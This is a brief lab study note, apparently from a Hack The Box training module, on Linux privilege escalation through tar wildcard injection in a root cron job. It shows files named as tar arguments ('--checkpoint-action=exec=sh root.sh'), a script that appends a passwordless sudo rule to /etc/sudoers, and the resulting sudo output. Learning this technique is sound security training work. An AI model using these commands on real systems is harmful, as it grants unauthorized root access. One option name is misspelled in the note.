
The `tar` command has two options that can assist us with privesc:

1. Will run an arbitrary operating system command once the tar command executes
```
--checkpoin[=N]
```

2. The second option uses an `EXEC` action to execute when the above checkpoint is reached
```
--checkpoint-action=ACTION
```

Using a cron job with a wild card, you can write out the commands as filenames. After a minute, the cron job will run and the file names will be interpreted as arguments and execute whatever commands specified.

```
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

```
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```
	note: exec=sh is the action being set, this will tell tar to execute bash

Verify the files were created with `ls -la` and then verify sudo permissions with `sudo -l`

```
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```

